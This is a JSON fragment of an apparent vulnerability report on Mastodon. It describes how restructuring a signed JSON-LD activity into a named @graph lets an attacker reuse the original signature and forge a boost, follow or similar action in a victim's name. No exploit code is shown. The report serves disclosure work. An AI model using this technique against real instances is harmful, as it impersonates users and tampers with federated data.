  "description": "`ActivityPub::LinkedDataSignature#verify_actor!` verifies signatures over the **RDF canonicalization** of a JSON-LD document, but Mastodon then **dispatches** on the raw JSON tree shape. These two views diverge for documents containing named `@graph` blocks, because `JsonLdHelper#canonicalize` pipes quads through `RDF::Graph.new`, which silently strips graph names.\n\nAn attacker who observes *any* LD-signed activity with an embedded object — the canonical example being `Undo{Announce}` (an unboost) — can restructure the JSON to hoist the inner object (`Announce`) to the top level while pushing the outer wrapper (`Undo`) into a named `@graph`. The signature bytes are **reused unchanged**; the RDF triple set is identical; `verify_actor!` returns the victim; and `ProcessCollectionService` dispatches an `Announce` in the victim's name.\n\n**Demonstrated impact:** Convert a victim's `Undo{Announce}` (unboost) into an `Announce` (boost) attributed to the victim, persisted to the database and federated as a public status. The same technique applies to `Undo{Follow}`, `Undo{Like}`, `Undo{Block}`, `Reject{Follow}` → `Follow`, etc. — any activity with a structurally complete embedded sub-activity.",
  "location": "app/lib/activitypub/linked_data_signature.rb:28",
  "poc_sha256": "1ea154b5316d90a56209dab12e77121690df7629e6cc2814ba93544646847901",
  "project": "mastodon",
  "technical_details": "JsonLdHelper#canonicalize does `RDF::Graph.new << JSON::LD::API.toRdf(json)`; RDF::Graph represents a single unnamed graph and drops the graph_name component of incoming quads, so a document with the Undo moved into a named @graph yields exactly the same URDNA2015 N-Quads output and SHA-256 document_hash as the original. The signature therefore covers the RDF triple set, not the JSON tree shape that Activity.factory actually dispatches on, and embedding vs. IRI-referencing a node produces the same triple, letting the attacker freely rearrange the tree.",
  "title": "LD-Signature bypass via JSON-LD named-graph restructuring",
```
